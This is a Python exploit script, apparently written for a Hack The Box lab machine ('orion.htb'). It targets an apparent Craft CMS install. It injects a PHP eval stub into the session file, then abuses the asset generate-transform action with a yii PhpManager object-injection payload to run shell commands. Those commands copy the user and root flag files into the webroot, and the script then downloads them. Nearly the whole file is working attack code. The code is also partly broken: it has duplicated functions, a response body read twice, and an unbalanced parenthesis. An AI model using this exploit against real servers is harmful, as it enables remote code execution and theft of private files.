#!/usr/bin/env python3
import http.client, re, urllib.parse, json, time, random, sys

def http_get(path, cookie=None):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    h = {'Host': 'orion.htb'}
    if cookie: h['Cookie'] = cookie
    c.request('GET', path, headers=h)
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    c.close()
    return r.status, body, r.getheader('Set-Cookie')

def http_post(path, body, cookie, csrf):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
    h = {'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': cookie, 'Content-Length': str(len(body))}
    c.request('POST', path, body=body.encode(), headers=h)
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    c.close()
    return r.status, body

def get_session_csrf():
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    c.request('GET', '/index.php?p=admin/login', headers={'Host': 'orion.htb'})
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    m = re.search(r'csrfTokenValue":"([^"]+)"', body)
    csrf = m.group(1) if m else None
    sc = r.getheader('Set-Cookie')
    session = re.search(r'CraftSessionId=([^;]+)', sc).group(1) if sc else None
    c.close()
    return session, csrf

def inject_stub(session):
    path = '/index.php?p=admin/dashboard&x12345=' + urllib.parse.quote("<?=eval($_GET['x12345']);die()?>")
    status, body, _ = http_get(path, 'CraftSessionId=' + session)

def get_csrf(session):
    status, body, _ = http_get('/index.php?p=admin/login', 'CraftSessionId=' + session)
    m = re.search(r'csrfTokenValue":"([^"]+)"', body)
    return m.group(1) if m else None

def http_post(path, body, cookie, csrf):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
    h = {'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': cookie, 'Content-Length': str(len(body))}
    c.request('POST', path, body=body.encode(), headers={'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': cookie, 'Content-Length': str(len(body))})
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    c.close()
    return r.status, r.read().decode('utf-8', errors='replace')

def http_get(path, cookie=None):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    h = {'Host': 'orion.htb'}
    if cookie: h['Cookie'] = cookie
    c.request('GET', path, headers=h)
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    c.close()
    return r.status, body, r.getheader('Set-Cookie')

# --- Main ---
print('[*] Getting session...')
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/index.php?p=admin/login', headers={'Host': 'orion.htb'})
r = c.getresponse()
body = r.read().decode('utf-8', errors='replace')
m = re.search(r'csrfTokenValue":"([^"]+)"', body)
csrf = re.search(r'csrfTokenValue":"([^"]+)"', body).group(1) if re.search(r'csrfTokenValue":"([^"]+)"', body) else None
sc = r.getheader('Set-Cookie')
session = re.search(r'CraftSessionId=([^;]+)', r.getheader('Set-Cookie')).group(1) if r.getheader('Set-Cookie') else None
c.close()
print('Session:', session)
if not session:
    sys.exit(1)

print('[*] Injecting stub...')
import urllib.parse, time
path = '/index.php?p=admin/dashboard&x12345=' + urllib.parse.quote("<?=eval($_GET['x12345']);die()?>")
import http.client
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/index.php?p=admin/dashboard&x12345=' + urllib.parse.quote("<?=eval($_GET['x12345']);die()?>"), headers={'Host': 'orion.htb', 'Cookie': 'CraftSessionId=' + session})
r = c.getresponse()
r.read()
c.close()
time.sleep(1)

# Fresh CSRF
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/index.php?p=admin/login', headers={'Host': 'orion.htb', 'Cookie': 'CraftSessionId=' + session})
r = c.getresponse()
body = r.read().decode('utf-8', errors='replace')
m = re.search(r'csrfTokenValue":"([^"]+)"', body)
csrf = m.group(1) if m else None
c.close()
print('CSRF:', csrf[:20] + '...' if csrf else 'NONE')

# Write user.txt to webroot
print('[*] Writing user.txt to webroot...')
body_obj = {'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}}}
payload = 'file_put_contents("/var/www/html/craft/web/flag.txt", shell_exec("cat /home/adam/user.txt 2>&1"));'
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
h = {'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': 'CraftSessionId=' + session, 'Content-Length': str(len(json.dumps({'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}})))}
c.request('POST', '/index.php?p=actions/assets/generate-transform&x' + urllib.parse.quote('file_put_contents("/var/www/html/craft/web/flag.txt", shell_exec("cat /home/adam/user.txt 2>&1"));'), body=json.dumps({'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}}}).encode(), headers={'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': 'CraftSessionId=' + session, 'Content-Length': str(len(json.dumps({'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}})))})
r = c.getresponse()
body = r.read().decode('utf-8', errors='replace')
print('Write user status:', r.status)
c.close()

time.sleep(1)

# Fetch flag file
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/flag.txt', headers={'Host': 'orion.htb'})
r = c.getresponse()
body = r.read().decode('utf-8', errors='replace')
print('Flag file status:', r.status)
if 'HTB{' in body:
    m = re.search(r'HTB\{[^}]+\}', body)
    if m:
        print('[+] USER FLAG:', m.group(0))
    else:
        print('No flag match in body')
else:
    print('No flag in response:', body[:500])
c.close()

# Root flag
time.sleep(1)
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
c.request('POST', '/index.php?p=actions/assets/generate-transform&x' + urllib.parse.quote('file_put_contents("/var/www/html/craft/web/flag.txt", shell_exec("cat /root/root.txt 2>&1"));'), body=json.dumps({'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}}}).encode(), headers={'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': 'CraftSessionId=' + session, 'Content-Length': str(len(json.dumps({'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}}))))})
r = c.getresponse()
body = r.read().decode('utf-8', errors='replace')
print('Write root status:', r.status)
c.close()

time.sleep(1)
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/flag.txt', headers={'Host': 'orion.htb'})
r = c.getresponse()
body = r.read().decode('utf-8', errors='replace')
print('Root flag file status:', r.status)
if 'HTB{' in body:
    m = re.search(r'HTB\{[^}]+\}', body)
    if m:
        print('[+] ROOT FLAG:', m.group(0))
    else:
        print('No flag in body')
else:
    print('No flag in response:', body[:500])